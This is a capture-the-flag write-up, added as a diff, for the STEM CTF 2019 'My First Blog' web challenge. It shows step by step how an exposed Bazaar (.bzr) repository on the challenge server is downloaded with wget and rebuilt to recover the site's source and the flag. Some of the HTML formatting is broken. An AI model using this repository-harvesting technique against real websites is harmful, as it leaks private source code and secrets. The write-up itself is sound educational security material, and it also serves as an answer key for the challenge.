@@ -1,0 +1,139 @@
+<h1>STEM CTF Cyber Challenge 2019 – My First Blog</h1>
+
+<ul>
+<li><strong>Category:</strong> Web</li>
+<li><strong>Points:</strong> 150</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>I wish canonical would release a blog platform, they make everything so easy to use and it just works!</p>
+  
+  <p>http://138.247.13.106/</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>The owner of the blog is a fan of Canonical and its products. As you can see in the blog, he is fan of <a href="http://bazaar.canonical.com/en/">Bazaar</a>, the version control system of Canonical.</p>
+
+<p>Trying to connect to <code>http://138.247.13.106/.bzr/</code> will give an <code>HTTP 403 Forbidden</code> error, so the folder should exist.</p>
+
+<p>Connecting to <code>http://138.247.13.106/.bzr/README</code> will reveal the existence of a Bazaar repository folder.</p>
+
+<p>Furthermore, connecting to <code>http://138.247.13.106/.bzr/branch/last-revision</code>, will reveal the last revision.</p>
+
+<p><code>
+1 bzr_lover-20181206184825-790ppqxy6l69f581
+</code></p>
+
+<p>So Bazaar must be installed and a <code>bzr</code> repostitory must be created in order to craft the <code>.bzr</code> directory and then recreate the website files.</p>
+
+<p><code>
+$ mkdir ctf-bzr
+$ cd ctf-bzr/
+$ bzr init
+$ echo 'foo' &gt; foo.txt
+$ bzr add
+$ bzr commit
+$ rm foo.txt
+</code></p>
+
+<p>The <code>last-revision</code> can be downloaded to replace the existing one.</p>
+
+<p><code>
+$ cd .bzr/branch
+$ rm last-revision
+$ wget http://138.247.13.106/.bzr/branch/last-revision
+</code></p>
+
+<p>The <code>dirstate</code> file can be downloaded to replace the existing one.</p>
+
+<p><code>
+$ cd ../checkout
+$ rm dirstate
+$ wget http://138.247.13.106/.bzr/checkout/dirstate
+</code></p>
+
+<p>The <code>pack-names</code> file can be downloaded replacing the existing one.</p>
+
+<p><code>
+$ cd ../repository
+$ rm pack-names
+$ wget http://138.247.13.106/.bzr/repository/pack-names
+</code></p>
+
+<p>Using <code>bzr check</code> command will trigger an error that will reveal the name of the missing files.</p>
+
+<p><code>
+$ cd ../../
+$ bzr check
+</code></p>
+
+<p>The name is: <code>ctf-bzr/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.rix</code>, so all missing files can be downloaded.</p>
+
+<p><code>
+$ cd .bzr/repository/indices/
+$ rm *.*
+$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.rix
+$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.cix
+$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.iix
+$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.six
+$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.tix
+$ cd ../packs
+$ rm *.pack
+$ wget http://138.247.13.106/.bzr/repository/packs/c325a543411b3717bd63b6cc879e3d50.pack
+</code></p>
+
+<p>Then the status of the repo could be checked.</p>
+
+<p><code>
+$ bzr status
+removed:
+  index.php
+</code></p>
+
+<p>The command <code>bzr revert</code> will recreate the file.</p>
+
+<p>```php
+<html>
+    <head>
+        <title>My Blog</title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" 
+crossorigin="anonymous">
+    </head>
+    <body></p>
+
+<pre><code>    &lt;div class="container"&gt;
+    &lt;div class="jumbotron"&gt;
+        &lt;h1 class="display-4"&gt;My Blog&lt;/h1&gt;
+        &lt;p class="lead"&gt;Just a spot for me to talk about how much I love Canonical&lt;/p&gt;
+    &lt;/div&gt;
+        &lt;h1&gt;I love Canonical&lt;/h1&gt;
+        &lt;p&gt;As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I'v
+</code></pre>
+
+<p>e tried out</p>
+            <ul>
+                <li>Juju - The worlds best configuration management tool!</li>
+                <li>Bazaar - The worlds best version control!</li>
+                <li>Ubuntu - The worlds best OS!</li>
+                <li>Launchpad - GitHub? Gross!</li>
+            </ul>
+            <hr>
+            <h1>Learning PHP</h1>
+            <p>I recently learned about PHP and I can't stop switching everything over to it. In fact, this blog is now powered by PHP, I think! I changed the file extension at least, and adde
+d a little PHP code below here. That should pretty much do it right? I have the PHP code commented out for now since I can't seem to get it to work right. I'll have to look into it later.</p>
+            <?php
+                // Flag is MCA{canonical<em>is</em>literally<em>my</em>favorite<em>company</em>in<em>the</em>whole_world}
+            ?>
+        </div>
+    </body>
+</html>
+```</p>
+
+<p>It will contain the flag.</p>
+
+<p><code>
+MCA{canonical_is_literally_my_favorite_company_in_the_whole_world}
+</code></p>
